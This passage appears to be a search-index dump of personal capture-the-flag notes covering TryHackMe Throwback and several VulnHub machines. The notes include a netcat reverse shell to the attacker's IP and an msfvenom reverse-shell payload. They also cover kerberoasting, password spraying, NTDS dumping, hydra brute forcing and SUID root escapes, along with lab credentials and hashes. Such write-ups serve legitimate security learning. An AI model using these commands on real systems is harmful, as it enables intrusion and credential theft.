PetersJ::THROWBACK:7a2ed99ae94b628d:46BCDA098495DD840497B271AB1AFCFC:010100000000000080BB3BD71076D80133AD655EA83F9B8B0000000002000800550045004700340001001E00570049004E002D0034005600510035003700310047004D0046003100380004003400570049004E002D0034005600510035003700310047004D004600310038002E0055004500470034002E004C004F00430041004C000300140055004500470034002E004C004F00430041004C000500140055004500470034002E004C004F00430041004C000700080080BB3BD71076D80106000400020000000800300030000000000000000000000000200000CDD5ADC02DBE3FC910A144BC26F8BC0190D5E8A65DC06FFB157CBA1C10EC42920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00370031002E00360033000000000000000000","title":"Loot"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/","text":"Left off: Task 23 Task 23 \u00b6 Bloodhound Install 3.x Set up proxy ssh blairej@throwback-WS01 copy over SharpHound.ps1 run Load to bloodhound answer questions Task 24 \u00b6 Get SPN for kerberoasting proxychains GetUserSPNs.py -dc-ip 10.200.70.117 THrowback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request crack the hash hashcat hash /usr/share/wordlists/rockyou.txt Task 25 \u00b6 scan the subnet with cme proxychains crackmapexec smb 10.200.70.0/24 Foxyproxy timekeep webserver password reset email Task 26 \u00b6 Malicious macro get meterpreter Task 27 \u00b6 migrate to system dump hashes crack the new hash Task 28 \u00b6 enumerate teh db mysql.exe -u root -p Task 29 \u00b6 cme to password spray proxychains crackmapexec smb 10.200.70.117 -u <users> -p <passes> Task 30 \u00b6 Use bloodhound to find principals with dcsync rights dump NTDS with impacket secretsdump.py -dc-ip 10.200.70.117 Throwback/<user>@10.200.70.117","title":"Session 7"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-23","text":"Bloodhound Install 3.x Set up proxy ssh blairej@throwback-WS01 copy over SharpHound.ps1 run Load to bloodhound answer questions","title":"Task 23"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-24","text":"Get SPN for kerberoasting proxychains GetUserSPNs.py -dc-ip 10.200.70.117 THrowback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request crack the hash hashcat hash /usr/share/wordlists/rockyou.txt","title":"Task 24"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-25","text":"scan the subnet with cme proxychains crackmapexec smb 10.200.70.0/24 Foxyproxy timekeep webserver password reset email","title":"Task 25"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-26","text":"Malicious macro get meterpreter","title":"Task 26"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-27","text":"migrate to system dump hashes crack the new hash","title":"Task 27"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-28","text":"enumerate teh db mysql.exe -u root -p","title":"Task 28"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-29","text":"cme to password spray proxychains crackmapexec smb 10.200.70.117 -u <users> -p <passes>","title":"Task 29"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%207/#task-30","text":"Use bloodhound to find principals with dcsync rights dump NTDS with impacket secretsdump.py -dc-ip 10.200.70.117 Throwback/<user>@10.200.70.117","title":"Task 30"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%208/","text":"Bloodhound Get SPN for kerberoasting timekeep webserver password reset email Malicious macro get meterpreter migrate to system dump hashes crack the new hash enumerate teh db Task 29 \u00b6 cme to password spray proxychains crackmapexec smb 10.200.70.117 -u <users> -p <passes> Task 30 \u00b6 Use bloodhound to find principals with dcsync rights dump NTDS with impacket secretsdump.py -dc-ip 10.200.70.117 Throwback/<user>@10.200.70.117","title":"Session 8"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%208/#task-29","text":"cme to password spray proxychains crackmapexec smb 10.200.70.117 -u <users> -p <passes>","title":"Task 29"},{"location":"TryHackMe/Work%20in%20Progress/Throwback/session%208/#task-30","text":"Use bloodhound to find principals with dcsync rights dump NTDS with impacket secretsdump.py -dc-ip 10.200.70.117 Throwback/<user>@10.200.70.117","title":"Task 30"},{"location":"VulnHub/Assertion%20101/","text":"Assertion 101 \u00b6 192.168.1.100 ```","title":"Assertion 101"},{"location":"VulnHub/Assertion%20101/#assertion-101","text":"192.168.1.100 ```","title":"Assertion 101"},{"location":"VulnHub/Cute/","text":"Cute \u00b6 IP Address 192.168.1.191 Open ports \u00b6 ```open ports 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 88/tcp open http syn-ack ttl 64 nginx 1.14.2 110/tcp open pop3 syn-ack ttl 64 Courier pop3d 995/tcp open ssl/pop3 syn-ack ttl 64 Courier pop3d ## Port 80 Apache 2.4.38 ![Pasted image 20220505202925.png](./Pasted image 20220505202925.png) ### Cute PHP/ Cute news Looks like some kind of php sandbox ![Pasted image 20220505203313.png](./Pasted image 20220505203313.png) Software name ![Pasted image 20220505203334.png](./Pasted image 20220505203334.png) Captcha ![Pasted image 20220505203352.png](./Pasted image 20220505203352.png) Login screen ![Pasted image 20220505203423.png](./Pasted image 20220505203423.png) Some migration page ![Pasted image 20220505203520.png](./Pasted image 20220505203520.png) Failed login; username disclosure ![Pasted image 20220505203818.png](./Pasted image 20220505203818.png) ## CVE-2019-11447 [EDB-48800](https://www.exploit-db.com/exploits/48800) is an RCE exploit for Cute 2.1.2. I had to remove `/CuteNews/` from all the URL strings. But then it gave this shell as `www-data` ![Pasted image 20220506052027.png](./Pasted image 20220506052027.png) ### Get a better shell ```bash nc -e /bin/bash 192.168.1.112 4444 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm User flag \u00b6 Becasue of bad file permissions, I am able to get the user flag as www-data dcb8189a0eaf7a690a67785a7299be60 Linpeas findings \u00b6 Internal only ports No password sudo for www-data Privesc \u00b6 hping3 has the SUID bit set. https://gtfobins.github.io/gtfobins/hping3/#suid run the SUID binary /usr/sbin/hping3 Break out into root shell /bin/sh -p Root Flag \u00b6 0b18032c2d06d9e738ede9bc24795ff2","title":"Cute"},{"location":"VulnHub/Cute/#cute","text":"IP Address 192.168.1.191","title":"Cute"},{"location":"VulnHub/Cute/#open-ports","text":"```open ports 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 88/tcp open http syn-ack ttl 64 nginx 1.14.2 110/tcp open pop3 syn-ack ttl 64 Courier pop3d 995/tcp open ssl/pop3 syn-ack ttl 64 Courier pop3d ## Port 80 Apache 2.4.38 ![Pasted image 20220505202925.png](./Pasted image 20220505202925.png) ### Cute PHP/ Cute news Looks like some kind of php sandbox ![Pasted image 20220505203313.png](./Pasted image 20220505203313.png) Software name ![Pasted image 20220505203334.png](./Pasted image 20220505203334.png) Captcha ![Pasted image 20220505203352.png](./Pasted image 20220505203352.png) Login screen ![Pasted image 20220505203423.png](./Pasted image 20220505203423.png) Some migration page ![Pasted image 20220505203520.png](./Pasted image 20220505203520.png) Failed login; username disclosure ![Pasted image 20220505203818.png](./Pasted image 20220505203818.png) ## CVE-2019-11447 [EDB-48800](https://www.exploit-db.com/exploits/48800) is an RCE exploit for Cute 2.1.2. I had to remove `/CuteNews/` from all the URL strings. But then it gave this shell as `www-data` ![Pasted image 20220506052027.png](./Pasted image 20220506052027.png) ### Get a better shell ```bash nc -e /bin/bash 192.168.1.112 4444 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm","title":"Open ports"},{"location":"VulnHub/Cute/#user-flag","text":"Becasue of bad file permissions, I am able to get the user flag as www-data dcb8189a0eaf7a690a67785a7299be60","title":"User flag"},{"location":"VulnHub/Cute/#linpeas-findings","text":"Internal only ports No password sudo for www-data","title":"Linpeas findings"},{"location":"VulnHub/Cute/#privesc","text":"hping3 has the SUID bit set. https://gtfobins.github.io/gtfobins/hping3/#suid run the SUID binary /usr/sbin/hping3 Break out into root shell /bin/sh -p","title":"Privesc"},{"location":"VulnHub/Cute/#root-flag","text":"0b18032c2d06d9e738ede9bc24795ff2","title":"Root Flag"},{"location":"VulnHub/Cybersploit/","text":"Cybersploit \u00b6 Port scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu)) Port 80 \u00b6 Homepage, none of the nav buttons appear to do anything. Found a username itsskv in the HTML comments Robots.txt has a long string Long string base64 decoded: Good Work ! Flag1: cybersploit{youtube.com/c/cybersploit} Now have some secret data and a username, tried logging in: ssh itsskv@192.168.1.114 Password: cybersploit{youtube.com/c/cybersploit} It worked found another flag cybersploit{https:t.me/cybersploit1} I tried to su to cybersploit user and to root using this flag as the password. That did not work. I ran linpeas and didn't see any config issues. The only thing that really stands out is the old linux version. Linux-exploit-suggester recommends dirtycow (fail), dirtycow2 (fail), overlay-fs (pass) Privesc with overlayfs \u00b6 Using edb-37292 (CVE-2015-1328) I was able to get a root shell. cybersploit{Z3X21CW42C4 many many congratulations !}","title":"Cybersploit"},{"location":"VulnHub/Cybersploit/#cybersploit","text":"","title":"Cybersploit"},{"location":"VulnHub/Cybersploit/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))","title":"Port scan"},{"location":"VulnHub/Cybersploit/#port-80","text":"Homepage, none of the nav buttons appear to do anything. Found a username itsskv in the HTML comments Robots.txt has a long string Long string base64 decoded: Good Work ! Flag1: cybersploit{youtube.com/c/cybersploit} Now have some secret data and a username, tried logging in: ssh itsskv@192.168.1.114 Password: cybersploit{youtube.com/c/cybersploit} It worked found another flag cybersploit{https:t.me/cybersploit1} I tried to su to cybersploit user and to root using this flag as the password. That did not work. I ran linpeas and didn't see any config issues. The only thing that really stands out is the old linux version. Linux-exploit-suggester recommends dirtycow (fail), dirtycow2 (fail), overlay-fs (pass)","title":"Port 80"},{"location":"VulnHub/Cybersploit/#privesc-with-overlayfs","text":"Using edb-37292 (CVE-2015-1328) I was able to get a root shell. cybersploit{Z3X21CW42C4 many many congratulations !}","title":"Privesc with overlayfs"},{"location":"VulnHub/DC-1/","text":"DC-1 \u00b6 Port scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.2.22 ((Debian)) 111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000) 53381/tcp open status syn-ack ttl 64 1 (RPC #100024) Port 80: Drupal 7 \u00b6 Vulnerable to CVE-2018-7600 exploit for drupal 7 < 7.57 ./drupa7-CVE-2018-7600.py -c whoami http://192.168.1.114:80/ check the architecture generate a reverse shell with msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.112 LPORT=80 -f elf -o reverse.elf copy the payload over using python3 webserver and wget. reverse shell fix it python -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm Linpeas findings \u00b6 credentials to the backend db of drupal SUID set for /usr/bin/find exploitable with the following (sourced from GTFObins ) find . -exec /bin/sh \\; -quit got a root shell There are 2 users in the db Maybe I'll come back and try to recover their passwords someday.","title":"DC-1"},{"location":"VulnHub/DC-1/#dc-1","text":"","title":"DC-1"},{"location":"VulnHub/DC-1/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.2.22 ((Debian)) 111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000) 53381/tcp open status syn-ack ttl 64 1 (RPC #100024)","title":"Port scan"},{"location":"VulnHub/DC-1/#port-80-drupal-7","text":"Vulnerable to CVE-2018-7600 exploit for drupal 7 < 7.57 ./drupa7-CVE-2018-7600.py -c whoami http://192.168.1.114:80/ check the architecture generate a reverse shell with msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.112 LPORT=80 -f elf -o reverse.elf copy the payload over using python3 webserver and wget. reverse shell fix it python -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm","title":"Port 80: Drupal 7"},{"location":"VulnHub/DC-1/#linpeas-findings","text":"credentials to the backend db of drupal SUID set for /usr/bin/find exploitable with the following (sourced from GTFObins ) find . -exec /bin/sh \\; -quit got a root shell There are 2 users in the db Maybe I'll come back and try to recover their passwords someday.","title":"Linpeas findings"},{"location":"VulnHub/DC-2/","text":"DC-2 \u00b6 Port Scan \u00b6 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) Port 80: Wordpress \u00b6 Username disclosure on the login screen \u00b6 existing user non-existing user a clue nmap script scan http-wordpress-users found a few users. users.txt contains the users pictured above dc2-wordlists.txt contains the output of this cewl command: cewl http://dc-2/ -m 6 -w dc2-wordlists.txt Then did a dictionary attack with the .txt files mentioned above hydra -L users.txt -P dc2-wordlists.txt -s 80 dc-2 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&testcookie='1'&wp-submit='Log+In':F=The password you entered\" found 2 good sets of credentials tom: parturient jerry: adipiscing another clue I got impatient looking for a way to exploit wordpress, and discovered that tom is able to log in via ssh BUUUUT it's an rbash shell Maybe one of the available binaries will be helpful was able to break out with some GTFOBins vi :set shell=/bin/sh :shell I was able to su to jerry /bin/su jerry the password was the same one from wordpress adipiscing 'no hints' they say. But that last line seems like a cheesy joke. Maybe SUID for git or something similar is going to be the root path. lol GTFOBins to the rescue again! I opted for path b in SUDO sudo git -p help config !/bin/sh","title":"DC-2"},{"location":"VulnHub/DC-2/#dc-2","text":"","title":"DC-2"},{"location":"VulnHub/DC-2/#port-scan","text":"80/tcp open http syn-ack ttl 64 Apache httpd 2.4.10 ((Debian)) 7744/tcp open ssh syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)","title":"Port Scan"},{"location":"VulnHub/DC-2/#port-80-wordpress","text":"","title":"Port 80: Wordpress"},{"location":"VulnHub/DC-2/#username-disclosure-on-the-login-screen","text":"existing user non-existing user a clue nmap script scan http-wordpress-users found a few users. users.txt contains the users pictured above dc2-wordlists.txt contains the output of this cewl command: cewl http://dc-2/ -m 6 -w dc2-wordlists.txt Then did a dictionary attack with the .txt files mentioned above hydra -L users.txt -P dc2-wordlists.txt -s 80 dc-2 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&testcookie='1'&wp-submit='Log+In':F=The password you entered\" found 2 good sets of credentials tom: parturient jerry: adipiscing another clue I got impatient looking for a way to exploit wordpress, and discovered that tom is able to log in via ssh BUUUUT it's an rbash shell Maybe one of the available binaries will be helpful was able to break out with some GTFOBins vi :set shell=/bin/sh :shell I was able to su to jerry /bin/su jerry the password was the same one from wordpress adipiscing 'no hints' they say. But that last line seems like a cheesy joke. Maybe SUID for git or something similar is going to be the root path. lol GTFOBins to the rescue again! I opted for path b in SUDO sudo git -p help config !/bin/sh","title":"Username disclosure on the login screen"},{"location":"VulnHub/Dawn/","text":"Dawn \u00b6 192.168.1.165 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3306/tcp open mysql syn-ack ttl 64 MySQL 5.5.5-10.3.15-MariaDB-1 80 - webserver \u00b6 Appears to be an internal IT Support site which is currently under construction The logs directory on the webserver has some files. I can only access management.log It looks like there are 2 files being executed on some interval: product-control is being executed by UID: 1000 web-control is b eing executed by UID: 33 139, 445 - SMB \u00b6 I have Read/Write access to a share called ITDEPT. There is nothing on there but I'm able to upload stuff. 3306 - MySQL \u00b6 There is a MariaDB server running which allows remote connections. The version is 5.5.5-10.3.15. There isa plugin running called mysql_native_password . The plugin appears to be vulnerable but i haven't been able to exploit it yet. Then answer from this page explains the plugin. And it can be exploited with this POC . Exploitation \u00b6 The SMB Share naem is the same as hte folder from logs. So I made a reverse shell named product-control and uploaded it to the webserver. After a few minutes I had a shell as the user Dawn. Upgrade the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm Enumerate Dawn \u00b6 Lets take a look at Dawn's files her bash history her mysql history Linpeas findings \u00b6 /bin/zsh has the SUID bit set. I now have a root shell Normally this is where I\"ll stop, but I wasn't satisfied. There is a still a MySQL database full of info I didn't exfiltrate. Tried hopping on the db as root: So I need root's password. Maybe I can change it? It's dirty, but I can backup /etc/shadow before changing root's password then restore it to cover my tracks when I'm done Hm...there was another user, maybe I can find something in their environment. I ran cat .bash_history and violla! A password in cleartext! thisisareallysecurepasswordnooneisgoingtoeverfind Now I'm able to get a proper root shell, AND explore the DB. waiiiit....I still can't get into the DB. Going to reset the password so I can browse the DB to see what's in there. And I'm in Also, I was able to find the root password in /root/.mysql_history There wasn't anything interesting in the database, as far as I can tell it was just a diversion. It worked, I spent way too much time trying to figure out how to exploit that dang mysql_naitive_password vulnerability, which ultimately I couldn't get to work.","title":"Dawn"},{"location":"VulnHub/Dawn/#dawn","text":"192.168.1.165 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) 139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3306/tcp open mysql syn-ack ttl 64 MySQL 5.5.5-10.3.15-MariaDB-1","title":"Dawn"},{"location":"VulnHub/Dawn/#80-webserver","text":"Appears to be an internal IT Support site which is currently under construction The logs directory on the webserver has some files. I can only access management.log It looks like there are 2 files being executed on some interval: product-control is being executed by UID: 1000 web-control is b eing executed by UID: 33","title":"80 - webserver"},{"location":"VulnHub/Dawn/#139-445-smb","text":"I have Read/Write access to a share called ITDEPT. There is nothing on there but I'm able to upload stuff.","title":"139, 445 - SMB"},{"location":"VulnHub/Dawn/#3306-mysql","text":"There is a MariaDB server running which allows remote connections. The version is 5.5.5-10.3.15. There isa plugin running called mysql_native_password . The plugin appears to be vulnerable but i haven't been able to exploit it yet. Then answer from this page explains the plugin. And it can be exploited with this POC .","title":"3306 - MySQL"},{"location":"VulnHub/Dawn/#exploitation","text":"The SMB Share naem is the same as hte folder from logs. So I made a reverse shell named product-control and uploaded it to the webserver. After a few minutes I had a shell as the user Dawn. Upgrade the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm","title":"Exploitation"},{"location":"VulnHub/Dawn/#enumerate-dawn","text":"Lets take a look at Dawn's files her bash history her mysql history","title":"Enumerate Dawn"},{"location":"VulnHub/Dawn/#linpeas-findings","text":"/bin/zsh has the SUID bit set. I now have a root shell Normally this is where I\"ll stop, but I wasn't satisfied. There is a still a MySQL database full of info I didn't exfiltrate. Tried hopping on the db as root: So I need root's password. Maybe I can change it? It's dirty, but I can backup /etc/shadow before changing root's password then restore it to cover my tracks when I'm done Hm...there was another user, maybe I can find something in their environment. I ran cat .bash_history and violla! A password in cleartext! thisisareallysecurepasswordnooneisgoingtoeverfind Now I'm able to get a proper root shell, AND explore the DB. waiiiit....I still can't get into the DB. Going to reset the password so I can browse the DB to see what's in there. And I'm in Also, I was able to find the root password in /root/.mysql_history There wasn't anything interesting in the database, as far as I can tell it was just a diversion. It worked, I spent way too much time trying to figure out how to exploit that dang mysql_naitive_password vulnerability, which ultimately I couldn't get to work.","title":"Linpeas findings"},{"location":"VulnHub/Decoy/","text":"Decoy \u00b6 Netdiscover found this one running on 192.168.1.170 port scan reveals port 80 and 22 on port 80 we find a webserver which has a password protected zip file we used zip2john and john to crack the password server (296640a3b825115a47b68fc44501c828) we can ssh as the user 296640a3b825115a47b68fc44501c828 with password server however this is a very limited rbash session. After poking around I noticed the PATH is set to my home directory, so I used scp to copy over /bin/sh from my kali machine and was able to break out of rbash using that sh now we fix the path PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin;export PATH at this point we ended up looking at a walkthrough. There was a binary file in our home directory which gave us access to chkrootkit 0.49 EDB-33899 We are able to verify the software and version by looking through logs in the SV-502 logs. Root flag \u00b6","title":"Decoy"},{"location":"VulnHub/Decoy/#decoy","text":"Netdiscover found this one running on 192.168.1.170 port scan reveals port 80 and 22 on port 80 we find a webserver which has a password protected zip file we used zip2john and john to crack the password server (296640a3b825115a47b68fc44501c828) we can ssh as the user 296640a3b825115a47b68fc44501c828 with password server however this is a very limited rbash session. After poking around I noticed the PATH is set to my home directory, so I used scp to copy over /bin/sh from my kali machine and was able to break out of rbash using that sh now we fix the path PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin;export PATH at this point we ended up looking at a walkthrough. There was a binary file in our home directory which gave us access to chkrootkit 0.49 EDB-33899 We are able to verify the software and version by looking through logs in the SV-502 logs.","title":"Decoy"},{"location":"VulnHub/Decoy/#root-flag","text":"","title":"Root flag"},{"location":"VulnHub/Funbox%20EasyEnum/","text":"Funbox: EasyEnum \u00b6 192.168.1.136 Port scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu)) Found mini.php which is some mini shell. I was able to upload php-reverse-shell.php and get a shell as www-data. upgrade the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm Privesc from www-data \u00b6 /etc/passwd:oracle:$1$|O@GOeN\\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash dbpass= tgbzhnujm dbuser= phpmyadmin ssh oracle@192.168.1.136 hiphop Privesc \u00b6 linpeas discovered a few users that were previously logged in. I added their usernames to users.txt then brute forced. hydra -u -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.136 ssh The user goat is allowed to run mysql with sudo privs. GTFObins to the rescue. Root","title":"Funbox: EasyEnum"},{"location":"VulnHub/Funbox%20EasyEnum/#funbox-easyenum","text":"192.168.1.136","title":"Funbox: EasyEnum"},{"location":"VulnHub/Funbox%20EasyEnum/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu)) Found mini.php which is some mini shell. I was able to upload php-reverse-shell.php and get a shell as www-data. upgrade the shell python3 -c 'import pty; pty.spawn(\"/bin/bash\")' export TERM=xterm","title":"Port scan"},{"location":"VulnHub/Funbox%20EasyEnum/#privesc-from-www-data","text":"/etc/passwd:oracle:$1$|O@GOeN\\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash dbpass= tgbzhnujm dbuser= phpmyadmin ssh oracle@192.168.1.136 hiphop","title":"Privesc from www-data"},{"location":"VulnHub/Funbox%20EasyEnum/#privesc","text":"linpeas discovered a few users that were previously logged in. I added their usernames to users.txt then brute forced. hydra -u -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.136 ssh The user goat is allowed to run mysql with sudo privs. GTFObins to the rescue. Root","title":"Privesc"},{"location":"VulnHub/Funbox%20Rookie/","text":"Funbox Rookie \u00b6 192.168.1.149 Port scan \u00b6 21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.5e 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu)) ftp allows anonymous login, there are some interesting .zip flies and a .msg file which contains the message that is displayed upon login. I copied them all down to take a closer look. using unzip we discover these archives are password protected. Extract the hashes from each file: for file in $(ls *.zip); do zip2john $file > hashes; done Then crack them: john hashes only 2 were cracked right away. The discovered passwords can be used to unzip the archives. Each archive contains a private key. Tom's private key can be used for ssh authentication. chmod 600 id_rsa ssh -i id_rsa tom@192.168.1.149 it looks like we are in rbash I was able to break out by calling bash in interactive mode: bash -i found a potential password for Tom in the .mysql_history file using the newly found password, we see that Tom is allowed to sudo everything. sudo su","title":"Funbox Rookie"},{"location":"VulnHub/Funbox%20Rookie/#funbox-rookie","text":"192.168.1.149","title":"Funbox Rookie"},{"location":"VulnHub/Funbox%20Rookie/#port-scan","text":"21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.5e 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu)) ftp allows anonymous login, there are some interesting .zip flies and a .msg file which contains the message that is displayed upon login. I copied them all down to take a closer look. using unzip we discover these archives are password protected. Extract the hashes from each file: for file in $(ls *.zip); do zip2john $file > hashes; done Then crack them: john hashes only 2 were cracked right away. The discovered passwords can be used to unzip the archives. Each archive contains a private key. Tom's private key can be used for ssh authentication. chmod 600 id_rsa ssh -i id_rsa tom@192.168.1.149 it looks like we are in rbash I was able to break out by calling bash in interactive mode: bash -i found a potential password for Tom in the .mysql_history file using the newly found password, we see that Tom is allowed to sudo everything. sudo su","title":"Port scan"},{"location":"VulnHub/Funbox3/","text":"Funbox3 \u00b6 192.168.1.147 Port Scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu)) 33060/tcp open socks5 syn-ack ttl 64 Port 80: Apache webserver \u00b6 default apache page is displayed at the root robots.txt was disallowing /gym /Gym \u00b6 using LAMP not WAMP CRM at /admin/ \u00b6 another CRM at /index.php \u00b6 This one has username disclosure on the forgot password dialogue There's also the option to register for this one Bookstore at /store/ \u00b6 If this is projectworlds online bookstore 1.0, we could use EDB-47887 Another login page /secret/ \u00b6 Foothold \u00b6 I was able to get RCE as www-data with EDB-47887 The shell was sort of shitty tho, so I replaced the payload with some php from /usr/share/webshells/php/php-reverse-shell.php Then I had a fully interactive shell which allowed me to cd and such. found passwords.txt ssh: yxcvbnmYYY gym/admin: asdfghjklXXX /store: admin@admin.com admin I was able to log in as tony using the password he left me in his plaintext creds file. Tony has some interesting sudoers entries Rooted \u00b6","title":"Funbox3"},{"location":"VulnHub/Funbox3/#funbox3","text":"192.168.1.147","title":"Funbox3"},{"location":"VulnHub/Funbox3/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu)) 33060/tcp open socks5 syn-ack ttl 64","title":"Port Scan"},{"location":"VulnHub/Funbox3/#port-80-apache-webserver","text":"default apache page is displayed at the root robots.txt was disallowing /gym","title":"Port 80: Apache webserver"},{"location":"VulnHub/Funbox3/#gym","text":"using LAMP not WAMP","title":"/Gym"},{"location":"VulnHub/Funbox3/#crm-at-admin","text":"","title":"CRM at /admin/"},{"location":"VulnHub/Funbox3/#another-crm-at-indexphp","text":"This one has username disclosure on the forgot password dialogue There's also the option to register for this one","title":"another CRM at /index.php"},{"location":"VulnHub/Funbox3/#bookstore-at-store","text":"If this is projectworlds online bookstore 1.0, we could use EDB-47887 Another login page","title":"Bookstore at /store/"},{"location":"VulnHub/Funbox3/#secret","text":"","title":"/secret/"},{"location":"VulnHub/Funbox3/#foothold","text":"I was able to get RCE as www-data with EDB-47887 The shell was sort of shitty tho, so I replaced the payload with some php from /usr/share/webshells/php/php-reverse-shell.php Then I had a fully interactive shell which allowed me to cd and such. found passwords.txt ssh: yxcvbnmYYY gym/admin: asdfghjklXXX /store: admin@admin.com admin I was able to log in as tony using the password he left me in his plaintext creds file. Tony has some interesting sudoers entries","title":"Foothold"},{"location":"VulnHub/Funbox3/#rooted","text":"","title":"Rooted"},{"location":"VulnHub/Gaara/","text":"Gaara \u00b6 192.168.1.146 Port Scan \u00b6 22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) Nothing too interesting with the webserver, so I opted to brute-force ssh. hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.1.146 ssh Found an interesting base64 encoded clue decoded: The clue points to this file, which seems to contain some encrypted data: I couldn't figure out what cipher (if any) this is encrypted with. I also wasn't understanding the clues, but they appear to be based on a show Naruto. Linpeas finds an SUID GTFOBins makes this easy gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit root flag","title":"Gaara"},{"location":"VulnHub/Gaara/#gaara","text":"192.168.1.146","title":"Gaara"},{"location":"VulnHub/Gaara/#port-scan","text":"22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian)) Nothing too interesting with the webserver, so I opted to brute-force ssh. hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.1.146 ssh Found an interesting base64 encoded clue decoded: The clue points to this file, which seems to contain some encrypted data: I couldn't figure out what cipher (if any) this is encrypted with. I also wasn't understanding the clues, but they appear to be based on a show 